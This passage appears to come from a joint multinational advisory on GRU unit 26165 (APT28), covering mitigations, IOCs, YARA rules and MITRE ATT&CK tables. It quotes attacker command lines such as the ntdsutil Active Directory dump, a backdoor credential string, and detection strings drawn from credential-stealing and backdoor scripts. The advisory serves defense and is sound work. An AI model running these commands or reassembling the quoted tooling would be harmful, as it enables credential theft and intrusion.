+Perform threat and attack modeling to understand how sensitive systems may be compromised within an organization’s specific architecture and security controls. Use this to develop a monitoring strategy to detect compromise attempts and select appropriate products to enact this strategy.
+Collect and monitor Windows logs for certain events, especially for events that indicate that a log was cleared unexpectedly [D3-SFA].
+Enable optional security features in Windows to harden endpoints and mitigate initial access techniques [D3-AH]:
+Enable attack surface reduction rules to prevent executable content from email [D3-ABPI].
+Enable attack surface reduction rules to prevent execution of files from globally writeable directories, such as Downloads or %APPDATA% [D3-EAL].
+Unless users are involved in the development of scripts, limit the local execution of scripts (such as batch scripts, VBScript, JScript/JavaScript, and PowerShell [10]) to known scripts [D3-EI], and audit execution attempts.
+Disable Windows Host Scripting functionality and configure PowerShell to run in Constrained mode [D3-ACH].
+Where feasible, implement allowlisting for applications and scripts to limit execution to only those needed for authorized activities, blocking all others by default [D3-EAL].
+Consider using open source SIGMA rules as a baseline for detecting and alerting on suspicious file execution or command parameters [D3-PSA].
+Use services that provide enhanced browsing services and safe link checking [D3-URA]. Significant reductions in successful spearphishing attempts were noted when email providers began offering link checking and automatic file detonation to block malicious content.
+Where possible, block logins from public VPNs, including exit nodes in the same country as target systems, or, if they need to be allowed, alert on them for further investigation. Most organizations should not need to allow incoming traffic, especially logins to systems, from VPN services [D3-NAM].
+Educate users to only use approved corporate systems for relevant government and military business and avoid the use of personal accounts on cloud email providers to conduct official business. Network administrators should also audit both email and web request logs to detect such activity.
+Many organizations may not need to allow outgoing traffic to hosting and API mocking services, which are frequently used by GRU unit 26165. Organizations should consider alerting on or blocking the following services, with exceptions allowlisted for legitimate activity [D3-DNSDL].
+
+*.000[.]pe
+*.1cooldns[.]com
+*.42web[.]io
+*.4cloud[.]click
+*.accesscan[.]org
+*.bumbleshrimp[.]com
+*.camdvr[.]org
+*.casacam[.]net
+*.ddnsfree[.]com
+*.ddnsgeek[.]com
+*.ddnsguru[.]com
+*.dynuddns[.]com
+*.dynuddns[.]net
+*.free[.]nf
+*.freeddns[.]org
+*.frge[.]io
+*.glize[.]com
+*.great-site[.]net
+*.infinityfreeapp[.]com
+*.kesug[.]com
+*.loseyourip[.]com
+*.lovestoblog[.]com
+*.mockbin[.]io
+*.mockbin[.]org
+*.mocky[.]io
+*.mybiolink[.]io
+*.mysynology[.]net
+*.mywire[.]org
+*.ngrok[.]io
+*.ooguy[.]com
+*.pipedream[.]net
+*.rf[.]gd
+*.urlbae[.]com
+*.webhook[.]site
+*.webhookapp[.]com
+*.webredirect[.]org
+*.wuaze[.]com
+Heuristic detections for web requests to new subdomains, including of the above providers, may uncover malicious phishing activity [D3-DNRA]. Logging the requests for each sub-domain requested by users on a network, such as in DNS or firewall logs, may enable system administrators to identify new targeting and victims.
+
+Identity and Access Management
+
+Organizations should take measures to ensure strong access controls and mitigate against common credential theft techniques: 
+
+Use MFA with strong factors, such as passkeys or PKI smartcards, and require regular re-authentication [D3-MFA]. [11], [12] Strong authentication factors are not guessable using dictionary techniques, so they resist brute force attempts.
+Implement other mitigations for privileged accounts: including limiting the number of admin accounts, considering using hardware MFA tokens, and regularly reviewing all privileged user accounts [D3-JFAPA].
+Separate privileged accounts by role and alert on misuse of privileged accounts [D3-UAP]. For example, email administrator accounts should be different from domain administrator accounts.
+Reduce reliance on passwords; instead, consider using services like single sign-on [D3-TBA].
+For organizations using on-premises authentication and email services, plan to disable NTLM entirely and migrate to more robust authentication processes such as PKI certificate authentication.
+Do not store passwords in Group Policy Preferences (GPP). Remove all passwords previously included in GPP and change all passwords on the corresponding accounts [D3-CH]. [13]
+Use account throttling or account lockout [D3-ANET]:
+Throttling is preferred to lockout. Throttling progressively increases time delay between successive login attempts.
+Account lockout can leave legitimate users unable to access their accounts and requires access to an account recovery process.
+Account lockout can provide a malicious actor with an easy way to launch a Denial of Service (DoS).
+If using lockout, then allowing 5 to 10 attempts before lockout is recommended.
+Use a service to check for compromised passwords before using them [D3-SPP]. For example, “Have I Been Pwned” can be used to check whether a password has been previously compromised without disclosing the potential password.
+Change all default credentials [D3-CRO] and disable protocols that use weak authentication (e.g., clear-text passwords or outdated and vulnerable authentication or encryption protocols) or do not support multi-factor authentication [D3-ACH] [D3-ET]. Always configure access controls carefully to ensure that only well-maintained and well-authenticated accounts have access. [13]
+IP Camera Mitigations
+The following mitigation techniques for IP cameras can be used to defend against this type of malicious activity:
+
+Ensure IP cameras are currently supported. Replace devices that are out of support.
+Apply security patches and firmware updates to all IP cameras [D3-SU].
+Disable remote access to the IP camera, if unnecessary [D3-ITF].
+Ensure cameras are protected by a security appliance, if possible, such as by using a firewall to prevent communication with the camera from IP addresses not on an allowlist [D3-NAM].
+If remote access to IP camera feeds is required, ensure authentication is enabled [D3-AA] and use a VPN to connect remotely [D3-ET]. Use MFA for management accounts if supported [D3-MFA].
+Disable Universal Plug and Play (UPnP), Peer-to-Peer (P2P), and Anonymous Visit features on IP cameras and routers [D3-NI].
+Turn off other ports/services not in use (e.g., FTP, web interface, etc.) [D3-ACH].
+If supported, enable authenticated RTSP access only [D3-AA].
+Review all authentication activity for remote access to make sure it is valid and expected [D3-UBA]. Investigate any unexpected or unusual activity.
+Audit IP camera user accounts to ensure they are an accurate reflection of your organization and that they are being used as expected [D3-UAP].
+Configure, tune, and monitor logging—if available—on the IP camera.
+Indicators of Compromise (IOCs)
+Note: Specific IoCs may no longer be actor controlled, may themselves be compromised infrastructure or email accounts, or may be shared infrastructure such as public VPN or Tor exit nodes. Care should be taken when basing triaging logs or developing detection rules on these indicators. GRU unit 26165 almost certainly uses extensive further infrastructure and TTPs not specifically listed in this report.
+
+Utilities and scripts
+Legitimate utilities
+
+Unauthorized or unusual use of the following legitimate utilities can be an indication of a potential compromise:
+
+ntdsutil – A legitimate Windows executable used by threat actors to export contents of Active Directory
+wevtutil – A legitimate Windows executable used by threat actors to delete event logs
+vssadmin – A legitimate Windows executable possibly used by threat actors to make a copy of the server’s C: drive
+ADexplorer – A legitimate window executable to view, edit, and backup Active Directory Certificate Services
+OpenSSH – The Windows version of a legitimate open source SSH client
+schtasks – A legitimate Windows executable used to create persistence using scheduled tasks
+whoami – A legitimate Windows executable used to retrieve the name of the current user
+tasklist – A legitimate Windows executable used to retrieve the list of running processes
+hostname – A legitimate Windows executable used to retrieve the device name
+arp – A legitimate Windows executable used to retrieve the ARP table for mapping the network environment
+systeminfo – A legitimate Windows executable used to retrieve a comprehensive summary of device and operating system information
+net – A legitimate Windows executable used to retrieve detailed user information
+wmic – A legitimate Windows executable used to interact with Windows Management Instrumentation (WMI), such as to retrieve letters assigned to logical partitions on storage drives
+cacls – A legitimate Windows executable used to modify permissions on files
+icacls – A legitimate Windows executable used to modify permissions to files and handle integrity levels and ownership
+ssh – A legitimate Windows executable used to establish network shell connections
+reg – A legitimate Windows executable used to add to or modify the system registry 
+Note: Additional heuristics are needed for effective hunting for these and other living off the land (LOTL) binaries to avoid being overwhelmed by false positives if these legitimate management tools are used regularly. See the joint guide, Identifying and Mitigating Living Off the Land Techniques, for guidance on developing a multifaceted cybersecurity strategy that enables behavior analytics, anomaly detection, and proactive hunting, which are part of a comprehensive approach to mitigating cyber threats that employ LOTL techniques.
+
+Malicious scripts
+
+Certipy – An open source python tool for enumerating and abusing Active Directory Certificate Services
+Get-GPPPassword.py – An open source python script for finding insecure passwords stored in Group Policy Preferences
+ldap-dump.py – A script for enumerating user accounts and other information in Active Directory
+Hikvision backdoor string: “YWRtaW46MTEK”
+Suspicious command lines
+
+While the following utilities are legitimate, and using them with the command lines shown may also be legitimate, these command lines are often used during malicious activities and could be an indication of a compromise:
+
+edge.exe “-headless-new -disable-gpu”
+ntdsutil.exe "activate instance ntds" ifm "create full C:\temp\[a-z]{3}" quit quit
+ssh -Nf
+schtasks /create /xml
+Outlook CVE Exploitation IOCs
+md-shoeb@alfathdoor[.]com[.]sa
+jayam@wizzsolutions[.]com
+accounts@regencyservice[.]in
+m.salim@tsc-me[.]com
+vikram.anand@4ginfosource[.]com
+mdelafuente@ukwwfze[.]com
+sarah@cosmicgold469[.]co[.]za
+franch1.lanka@bplanka[.]com
+commerical@vanadrink[.]com
+maint@goldenloaduae[.]com
+karina@bhpcapital[.]com
+tv@coastalareabank[.]com
+ashoke.kumar@hbclife[.]in
+213[.]32[.]252[.]221
+124[.]168[.]91[.]178
+194[.]126[.]178[.]8
+159[.]196[.]128[.]120
+Commonly Used Webmail Providers
+portugalmail[.]pt
+mail-online[.]dk
+email[.]cz
+seznam[.]cz
+Malicious Archive Filenames Involving CVE-2023-38831
+calc.war.zip
+news_week_6.zip
+Roadmap.zip
+SEDE-PV-2023-10-09-1_EN.zip
+war.zip
+Zeyilname.zip
+Brute Forcing IP Addresses
+Disclaimer: These IP addresses date June 2024 through August 2024. The authoring agencies recommend organizations investigate or vet these IP addresses prior to taking action, such as blocking.
+
+June 2024	July 2024	August 2024
+192[.]162[.]174[.]94	207[.]244[.]71[.]84	31[.]135[.]199[.]145	79[.]184[.]25[.]198	91[.]149[.]253[.]204  
+103[.]97[.]203[.]29	162[.]210[.]194[.]2	31[.]42[.]4[.]138	79[.]185[.]5[.]142	91[.]149[.]254[.]75  
+209[.]14[.]71[.]127	 	46[.]112[.]70[.]252	83[.]10[.]46[.]174	91[.]149[.]255[.]122  
+109[.]95[.]151[.]207	 	46[.]248[.]185[.]236	83[.]168[.]66[.]145	91[.]149[.]255[.]19  
+ 	 	64[.]176[.]67[.]117	83[.]168[.]78[.]27	91[.]149[.]255[.]195  
+ 	 	64[.]176[.]69[.]196	83[.]168[.]78[.]31  	91[.]221[.]88[.]76  
+ 	 	64[.]176[.]70[.]18	83[.]168[.]78[.]55  	93[.]105[.]185[.]139  
+ 	 	64[.]176[.]70[.]238	83[.]23[.]130[.]49  	95[.]215[.]76[.]209  
+ 	 	64[.]176[.]71[.]201	83[.]29[.]138[.]115  	138[.]199[.]59[.]43  
+ 	 	70[.]34[.]242[.]220	89[.]64[.]70[.]69  	147[.]135[.]209[.]245  
+ 	 	70[.]34[.]243[.]226	90[.]156[.]4[.]204  	178[.]235[.]191[.]182  
+ 	 	70[.]34[.]244[.]100	91[.]149[.]202[.]215  	178[.]37[.]97[.]243  
+ 	 	70[.]34[.]245[.]215	91[.]149[.]203[.]73  	185[.]234[.]235[.]69  
+ 	 	70[.]34[.]252[.]168	91[.]149[.]219[.]158	192[.]162[.]174[.]67  
+ 	 	70[.]34[.]252[.]186	91[.]149[.]219[.]23  	194[.]187[.]180[.]20  
+ 	 	70[.]34[.]252[.]222	91[.]149[.]223[.]130  	212[.]127[.]78[.]170  
+ 	 	70[.]34[.]253[.]13	91[.]149[.]253[.]118	213[.]134[.]184[.]167
+ 	 	70[.]34[.]253[.]247  	91[.]149[.]253[.]198  	 
+ 	 	70[.]34[.]254[.]245	91[.]149[.]253[.]20  	 
+Detections
+Customized NTLM listener
+rule APT28_NTLM_LISTENER {
+
+       meta:
+
+              description = "Detects NTLM listeners including APT28's custom one"
+
+ 
+
+       strings:
+
+              $command_1 = "start-process powershell.exe -WindowStyle hidden"
+
+              $command_2 = "New-Object System.Net.HttpListener"
+
+              $command_3 = "Prefixes.Add('http://localhost:8080/')"
+
+              $command_4 = "-match 'Authorization'"
+
+              $command_5 = "GetValues('Authorization')"
+
+              $command_6 = "Request.RemoteEndPoint.Address.IPAddressToString"
+
+              $command_7 = "@(0x4e,0x54,0x4c,0x4d, 0x53,0x53,0x50,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x28,0x00,0x00,0x01,0x82,0x00,0x00,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00)"
+
+              $command_8 = ".AllKeys"
+
+              
+
+              $variable_1 = "$NTLMAuthentication" nocase
+
+              $variable_2 = "$NTLMType2" nocase
+
+              $variable_3 = "$listener" nocase
+
+              $variable_4 = "$hostip" nocase
+
+              $variable_5 = "$request" nocase
+
+              $variable_6 = "$ntlmt2" nocase
+
+              $variable_7 = "$NTLMType2Response" nocase
+
+              $variable_8 = "$buffer" nocase
+
+ 
+
+       condition:
+
+              5 of ($command_*) 
+
+              or
+
+              all of ($variable_*)
+
+}
+
+HEADLACE shortcut
+rule APT28_HEADLACE_SHORTCUT {
+
+       meta:
+
+              description = "Detects the HEADLACE backdoor shortcut dropper. Rule is meant for threat hunting."
+
+ 
+
+       strings:
+
+              $type = "[InternetShortcut]" ascii nocase
+
+              $url  = "file://"
+
+              $edge = "msedge.exe"
+
+              $icon = "IconFile"
+
+ 
+
+       condition:
+
+              all of them
+
+}
+
+HEADLACE credential dialogbox phishing 
+rule APT28_HEADLACE_CREDENTIALDIALOG {
+
+       meta:
+
+              description = "Detects scripts used by APT28 to lure user into entering credentials"
+
+ 
+
+       strings:
+
+              $command_1 = "while($true)"
+
+              $command_2 = "Get-Credential $(whoami)"
+
+              $command_3 = "Add-Content"
+
+              $command_4 = ".UserName"
+
+              $command_5 = ".GetNetworkCredential().Password"
+
+              $command_6 = "GetNetworkCredential().Password.Length -ne 0"
+
+ 
+
+       condition:
+
+              5 of them
+
+}
+
+HEADLACE core script
+rule APT28_HEADLACE_CORE {
+
+       meta:
+
+              description = "Detects HEADLACE core batch scripts"
+
+ 
+
+       strings:
+
+              $chcp = "chcp 65001" ascii
+
+              $headless = "start \"\" msedge --headless=new --disable-gpu" ascii
+
+              
+
+              $command_1 = "taskkill /im msedge.exe /f" ascii
+
+              $command_2 = "whoami>\"%programdata%" ascii
+
+              $command_3 = "timeout" ascii
+
+              $command_4 = "copy \"%programdata%\\" ascii
+
+ 
+
+              $non_generic_del_1 = "del /q /f \"%programdata%" ascii
+
+              $non_generic_del_3 = "del /q /f \"%userprofile%\\Downloads\\" ascii
+
+ 
+
+              $generic_del = "del /q /f" ascii
+
+ 
+
+       condition:
+
+              (
+
+                      $chcp 
+
+                      and 
+
+                      $headless
+
+              )
+
+              and
+
+              (
+
+                      1 of ($non_generic_del_*)
+
+                      or
+
+                      ($generic_del)
+
+                      or
+
+                      3 of ($command_*)
+
+              )
+
+}
+
+MASEPIE
+rule APT28_MASEPIE {
+
+       meta:
+
+              description = "Detects MASEPIE python script"
+
+ 
+
+       strings:
+
+              $masepie_unique_1 = "os.popen('whoami').read()"
+
+              $masepie_unique_2 = "elif message == 'check'"
+
+              $masepie_unique_3 = "elif message == 'send_file':"
+
+              $masepie_unique_4 = "elif message == 'get_file'"
+
+              $masepie_unique_5 = "enc_mes('ok'"
+
+              $masepie_unique_6 = "Bad command!'.encode('ascii'"
+
+              $masepie_unique_7 = "{user}{SEPARATOR}{k}"
+
+              $masepie_unique_8 = "raise Exception(\"Reconnect"
+
+ 
+
+       condition:
+
+              3 of ($masepie_unique_*)
+
+}
+
+STEELHOOK
+rule APT28_STEELHOOK {
+
+       meta:
+
+              description = "Detects APT28's STEELHOOK powershell script"
+
+ 
+
+       strings:
+
+              $s_1 = "$($env:LOCALAPPDATA\\\\Google\\\\Chrome\\\\User Data\\\\Local State)"
+
+              $s_2 = "$($env:LOCALAPPDATA\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data)"
+
+ 
+
+              $s_3 = "$($env:LOCALAPPDATA\\\\Microsoft\\\\Edge\\\\User Data\\\\Local State)"
+
+              $s_4 = "$($env:LOCALAPPDATA\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Login Data)"
+
+ 
+
+              $s_5 = "os_crypt.encrypted_key"
+
+              $s_6 = "System.Security.Cryptography.DataProtectionScope"
+
+              $s_7 = "[system.security.cryptography.protectdata]::Unprotect"
+
+              $s_8 = "Invoke-RestMethod"
+
+ 
+
+       condition:
+
+              all of them
+
+}
+
+PSEXEC
+rule GENERIC_PSEXEC {
+
+       meta:
+
+              description = "Detects SysInternals PSEXEC executable"
+
+ 
+
+       strings:
+
+              $sysinternals_1 = "SYSINTERNALS SOFTWARE LICENCE TERMS"
+
+              $sysinternals_2 = "/accepteula"
+
+              $sysinternals_3 = "Software\\Sysinternals"
+
+ 
+
+              $network_1 = "\\\\%s\\IPC$"
+
+              $network_2 = "\\\\%s\\ADMIN$\\%s"
+
+              $network_3 = "\\Device\\LanmanRedirector\\%s\\ipc$"
+
+ 
+
+              $psexec_1 = "PSEXESVC"
+
+              $psexec_2 = "PSEXEC-{}-"
+
+              $psexec_3 = "Copying %s to %s..."
+
+              $psexec_4 = "gPSINFSVC"
+
+ 
+
+ 
+
+       condition:
+
+              (
+
+                      ( uint16( 0x0 ) ==0x5a4d )
+
+                      and
+
+                      ( uint16( uint32( 0x3c )) == 0x4550 )
+
+              )
+
+              and 
+
+                      filesize < 1024KB
+
+              and
+
+              (
+
+                      ( any of ($sysinternals_*) and any of ($psexec_*) )
+
+                      or
+
+                      ( 2 of ($network_*) and 2 of ($psexec_*))
+
+              )
+
+}
+
+Cybersecurity Industry Tracking 
+The cybersecurity industry provides overlapping cyber threat intelligence, IOCs, and mitigation recommendations related to GRU unit 26165 cyber actors. While not all encompassing, the following are the most notable threat group names related under MITRE ATT&CK G0007 and commonly used within the cybersecurity community: 
+
+APT28 [14]
+Fancy Bear [14]
+Forest Blizzard [14]
+Blue Delta [15]
+Note: Cybersecurity companies have different methods of tracking and attributing cyber actors, and this may not be a 1:1 correlation to the U.S. government’s understanding for all activity related to these groupings.
+
+Further Reference
+To search for the presence of malicious email messages targeting CVE-2023-23397, network defenders may consider using the script published by Microsoft: https://aka.ms/CVE-2023-23397ScriptDoc. 
+
+For the Impacket TTP, network defenders may consider using the following publicly available Impacket YARA detection rule:
+https://github.com/Neo23x0/signature-base/blob/master/yara/gen_impacket_tools.yar
+
+Works Cited
+[1] Microsoft. Defending Ukraine: Early Lessons from the Cyber War. 2022. https://blogs.microsoft.com/on-the-issues/2022/06/22/defending-ukraine-early-lessons-from-the-cyber-war/  
+[2] FBI et al. Russian Cyber Actors Use Compromised Routers to Facilitate Cyber Operations. 2024. https://media.defense.gov/2024/Feb/27/2003400753/-1/-1/0/CSA-Russian-Actors-Use-Routers-Facilitate-Cyber_Operations.PDF   
+[3] NSA et al. Russian GRU Conducting Global Brute Force Campaign to Compromise Enterprise and Cloud Environments. 2021. https://media.defense.gov/2021/Jul/01/2002753896/-1/-1/0/CSA_GRU_GLOBAL_BRUTE_FORCE_CAMPAIGN_UOO158036-21.PDF 
+[4] ANSSI. Campagnes d'attaques du mode opératoire APT28 depuis 2021. 2023. https://cert.ssi.gouv.fr/cti/CERTFR-2023-CTI-009/  
+[5] ANSSI. Targeting and compromise of french entities using the APT28 intrusion set. 2025. https://cert.ssi.gouv.fr/cti/CERTFR-2025-CTI-007/   
+[6] Polish Cyber Command. Detecting Malicious Activity Against Microsoft Exchange Servers. 2023. https://www.wojsko-polskie.pl/woc/articles/aktualnosci-w/detecting-malicious-activity-against-microsoft-exchange-servers/ 
+[7] IBM. Israel-Hamas Conflict Lures to Deliver Headlace Malware. 2023. https://securityintelligence.com/x-force/itg05-ops-leverage-israel-hamas-conflict-lures-to-deliver-headlace-malware/ 
+[8] CERT-UA. APT28: From Initial Attack to Creating Domain Controller Threats in an Hour. 2023. https://cert.gov.ua/article/6276894 
+[9] NSA. Embracing a Zero Trust Security Model. 2021. https://media.defense.gov/2021/Feb/25/2002588479/-1/-1/0/CSI_EMBRACING_ZT_SECURITY_MODEL_UOO115131-21.PDF  
+[10] NSA et al. Keeping PowerShell: Security Measures to Use and Embrace. 2022. https://media.defense.gov/2022/Jun/22/2003021689/-1/-1/0/CSI_KEEPING_POWERSHELL_SECURITY_MEASURES_TO_USE_AND_EMBRACE_20220622.PDF 
+[11] National Institute of Standards and Technology (NIST). Special Publication 800-63B: Digital Identity Guidelines – Authentication and Lifecycle Management. 2020. https://pages.nist.gov/800-63-3/sp800-63b.html 
+[12] NSA. Selecting Secure Multi-factor Authentication Solutions. October 16, 2020. https://media.defense.gov/2024/Jul/31/2003515137/-1/-1/0/MULTIFACTOR_AUTHENTICATION_SOLUTIONS_UOO17091520.PDF  
+[13] NSA and CSA. NSA and CISA Red and Blue Teams Share Top Ten Cybersecurity Misconfigurations. 2023. https://media.defense.gov/2023/Oct/05/2003314578/-1/-1/0/JOINT_CSA_TOP_TEN_MISCONFIGURATIONS_TLP-CLEAR.PDF 
+
+[14] Department of Justice. Justice Department Conducts Court-Authorized Disruption of Botnet Controlled by the Russian Federation’s Main Intelligence Directorate of the General Staff (GRU). 2024. https://www.justice.gov/archives/opa/pr/justice-department-conducts-court-authorized-disruption-botnet-controlled-russian  
+[15] Recorded Future. GRU’s BlueDelta Targets Key Networks in Europe with Multi-Phase Espionage Campaigns. 2024. https://go.recordedfuture.com/hubfs/reports/CTA-RU-2024-0530.pdf  
+ 
+
+Disclaimer of endorsement
+The information and opinions contained in this document are provided "as is" and without any warranties or guarantees. Reference herein to any specific commercial products, process, or service by trade name, trademark, manufacturer, or otherwise, does not constitute or imply its endorsement, recommendation, or favoring by the United States Government, and this guidance shall not be used for advertising or product endorsement purposes.
+
+Purpose
+This document was developed in furtherance of the authoring agencies’ cybersecurity missions, including their responsibilities to identify and disseminate threats and to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate stakeholders.
+
+Contact
+United States organizations
+
+National Security Agency (NSA)
+Cybersecurity Report Feedback: CybersecurityReports@nsa.gov
+Defense Industrial Base Inquiries and Cybersecurity Services: DIB_Defense@cyber.nsa.gov
+Media Inquiries / Press Desk: NSA Media Relations: 443-634-0721, MediaRelations@nsa.gov
+Cybersecurity and Infrastructure Security Agency (CISA) and Federal Bureau of Investigation (FBI)
+U.S. organizations are encouraged to reporting suspicious or criminal activity related to information in this advisory to CISA via the agency’s Incident Reporting System, its 24/7 Operations Center (report@cisa.gov or 1-844-Say-CISA), or your local FBI field office. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment user for the activity; the name of the submitting company or organization; and a designated point of contact.
+Department of Defense Cyber Crime Center (DC3)
+Defense Industrial Base Inquiries and Cybersecurity Services: DC3.DCISE@us.af.mil
+Media Inquiries / Press Desk: DC3.Information@us.af.mil
+United Kingdom organizations
+
+Report significant cyber security incidents to ncsc.gov.uk/report-an-incident (monitored 24/7)
+Germany organizations
+
+Bundesnachrichtendienst (BND): Media Relations / Press Desk: +49 30 20 45 36 30, pressestelle@bnd.bund.de
+BfV Prevention/Economic Protection Unit: +49 30 18792-3322, wirtschaftsschutz@bfv.bund.de
+BSI Service-Center: +49 800 274 1000, service-center@bsi.bund.de
+Czech Republic organizations
+
+Security Information Service (BIS): cyber.threats@bis.cz
+National Cyber and Information Security Agency (NÚKIB): cert.incident@nukib.gov.cz 
+Poland organizations
+
+Poland Military Counterintelligence Service (SKW): cyber.int@skw.gov.pl
+Australian organizations
+
+Visit cyber.gov.au or call 1300 292 371 (1300 CYBER 1) to report cybersecurity incidents and access alerts and advisories.
+Canadian organizations
+
+Report incidents by emailing CCCS at contact@cyber.gc.ca.
+Estonia organizations
+
+Estonian Foreign Intelligence Service (EFIS): info@valisluureamet.ee
+Estonian National Cyber Security Centre (NCSC-EE): ria@ria.ee
+French organizations
+
+French organizations are encouraged to report suspicious activity or incident related to information found in this advisory by contacting ANSSI/CERT-FR by email at cert-fr@ssi.gouv.fr or by phone at: 3218 or +33 9 70 83 32 18. 
+Appendix A: MITRE ATT&CK tactics and techniques
+See Table 2 through Table 14 for all the threat actor tactics and techniques referenced in this advisory.
+
+Table 2: Reconnaissance
+Tactic/Technique Title	ID	Use
+Reconnaissance	TA0043	Conducted reconnaissance on at least one entity involved in the production of ICS components for railway management.
+Gather Victim Identity Information: Email Addresses	T1589.002	Conducted contact information reconnaissance to identify additional targets in key positions.
+Gather Victim Org Information	T1591	Conducted reconnaissance of the cybersecurity department.
+Gather Victim Org Information: Identify Roles	T1591.004	Conducted reconnaissance of individuals responsible for coordinating transport.
+Gather Victim Org Information: Business Relationships	T1591.002	Conducted reconnaissance of other companies cooperating with the victim entity.
+Gather Victim Host Information	T1592	Attempted to enumerate Real Time Streaming Protocol (RTSP) servers hosting IP cameras.
+ 
+
+Table 3: Resource development
+Tactic/Technique Title	ID	Use
+Compromise Accounts: Email Accounts	T1586.002	Sent phishing emails using compromised accounts.
+Compromise Accounts: Cloud Accounts	T1586.003	Sent phishing emails using compromised accounts.
+ 
+
+Table 4: Initial Access
+Tactic/Technique Title	ID	Use
+Trusted Relationship	T1199	Conducted follow-on targeting of additional entities in the transportation sector that had business ties to the primary target, exploiting trust relationships to attempt to gain additional access.
+Phishing	T1566	Used spearphishing for credentials and delivering malware to gain initial access to targeted entities.
+Phishing: Spearphishing Attachment	T1566.001	Sent emails with malicious attachments.
+Phishing: Spearphishing Link	T1566.002	Used spearphishing with included links to fake login pages. Sent emails with embedded hyperlinks that downloaded a malicious archive.
+Phishing: Spearphishing Voice	T1566.004	Attempted to use voice phishing to gain access to privileged accounts by impersonating IT staff.
+External Remote Services	T1133	Exploited Internet-facing infrastructure, including corporate VPNs, to gain initial access to targeted entities.
+Exploit Public-Facing Application	T1190	Exploited public vulnerabilities and SQL injection to gain initial access to targeted entities.
+Content Injection	T1659	Leveraged a WinRAR vulnerability allowing for the execution of arbitrary code embedded in an archive.
+Table 5: Execution
+Tactic/Technique Title	ID	Use
+User Execution: Malicious Link	T1204.001	Used malicious links to hosted shortcuts in spearphishing.
+User Execution: Malicious File	T1204.002	Delivered malware executables via spearphishing.
+Scheduled Task/Job: Scheduled Task	T1053.005	Used scheduled tasks to establish persistence.
+Command and Scripting Interpreter	T1059	Delivered scripts in spearphishing. Executed arbitrary shell commands.
+Command and Scripting Interpreter: PowerShell	T1059.001	PowerShell commands were often used to prepare data for exfiltration.
+Command and Scripting Interpreter: Windows Command Shell	T1059.003	Used BAT script in spearphishing.
+Command and Scripting Interpreter: Visual Basic	T1059.005	Used VBScript in spearphishing.
+Command and Scripting Interpreter: Python	T1059.006	Installed python on infected machines to enable the execution of Certipy.
+Table 6: Persistence
+Tactic/Technique Title	ID	Use
+Account Manipulation: 
+Additional Email Delegate 
+Permissions	
+T1098.002 
+
+Used manipulation of mailbox permissions to establish sustained email collection. 
+Modify Authentication Process: 
+Multi-Factor Authentication	
+T1556.006 
+
+Enrolled compromised accounts in MFA mechanisms to increase the trust-level of compromised accounts and enable sustained access. 
+Hijack Execution Flow: DLL 
+Search Order Hijacking 	T1574.001 	Used DLL search order hijacking to facilitate malware execution. 
+Boot or Logon Autostart 
+Execution: Registry Run Keys / 
+Startup Folder	
+ 
+
+T1547.001 
+
+Used run keys to establish persistence. 
+Boot or Logon Autostart 
+Execution: Shortcut 
+Modification	
+T1547.009 
+
+ 
+
+Placed malicious shortcuts in the startup folder to establish persistence. 
+Table 7: Defense Evasion
+Tactic/Technique Title	ID	Use
+Indicator Removal: Clear 
+Windows Event Logs	T1070.001 	Deleted event logs through the wevtutil utility.
+Table 8: Credential access 
+Tactic/Technique Title	ID	Use
+Brute Force 
+
+T1110 
+
+Sent requests with Base64-encoded credentials for the RTSP server, which included publicly documented default credentials, and likely were generic attempts to brute force access to the devices. 
+
+Brute Force: Password Guessing 
+
+T1110.001 
+
+Used credential guessing to gain initial access to targeted entities. 
+
+Brute Force: Password Spraying 
+
+T1110.003 
+
+Used brute force to gain initial access to targeted entities. Conducted a brute force password spray via LDAP. 
+
+Multi-Factor Authentication Interception 
+
+T1111 
+
+Used multi-stage redirectors to provide MFA relaying capabilities in some campaigns. 
+
+Input Capture 
+
+T1056 
+
+Used multi-stage redirectors to provide CAPTCHA relaying capabilities in some campaigns. 
+
+Forced Authentication 
+
+T1187 
+
+Used an Outlook NTLM vulnerability to collect NTLM hashes and credentials via specially crafted Outlook calendar appointment invitations. 
+
+OS Credential Dumping: NTDS 
+
+T1003.003 
+
+Attempted to dump Active Directory NTDS.dit domain databases. 
+
+Unsecured Credentials: Group Policy Preferences 
+
+T1552.006 
+
+Retrieved plaintext passwords via Group Policy Preferences using Get-GPPPassword.py. 
+
+Table 9: Discovery
+Tactic/Technique Title	ID	Use
+
+Account Discovery: Domain Account
+
+ 
+
+ 
+
+T1087.002
+
+ 
+
+Used a modified ldap-dump.py to enumerate the Windows environment.
+
+Table 10: Command and Control
+Tactic/Technique Title	ID	Use
+Hide Infrastructure 
+
+T1665 	
+Abused SOHO devices to facilitate covert cyber operations, as well as proxy malicious activity, via devices with geolocation in proximity to the target. 
+
+Proxy: External Proxy 
+
+T1090.002 	
+Actor-controlled servers sent RTSP DESCRIBE requests destined for RTSP servers. 
+
+Proxy: Multi-hop Proxy 
+
+T1090.003 	
+Used Tor and commercial VPNs as part of their anonymization infrastructure 
+
+Encrypted Channel 
+
+T1573 	
+Connected to victim infrastructure using encrypted TLS. 
+
+Multi-Stage Channels 
+
+T1104 	
+Used multi-stage redirectors for campaigns. 
+
+Table 11: Defense evasion (mobile framework)
+Tactic/Technique Title	ID	Use
+Execution Guardrails 
+
+T1627 
+
+Used multi-stage redirectors to verify browser fingerprints in some campaigns. 
+
+Execution Guardrails: Geofencing 
+
+T1627.001 
+
+Used multi-stage redirectors to verify IP-geolocation in some campaigns. 
+
+Table 12: Lateral movement
+Tactic/Technique Title	ID	Use
+Lateral Movement 
+
+TA0008 
+
+Used native commands and open source tools, such as Impacket and PsExec, to move laterally within the environment. 
+
+Remote Services: Remote Desktop Protocol 
+
+T1021.001 
+
+Moved laterally within the network using RDP. 
+
+Table 13: Collection
+Tactic/Technique Title	ID	Use
+Email Collection 
+
+T1114 
+
+Retrieved sensitive data from email servers. 
+
+Email Collection: Remote Email Collection 
+
+T1114.002 
+
+Used server data exchange protocols and APIs such as Exchange Web Services (EWS) and IMAP to exfiltrate data from email servers. 
+
+Automated Collection 
+
+T1119 
+
+Used periodic EWS queries to collect new emails. 
+
+Video Capture 
+
+T1125 
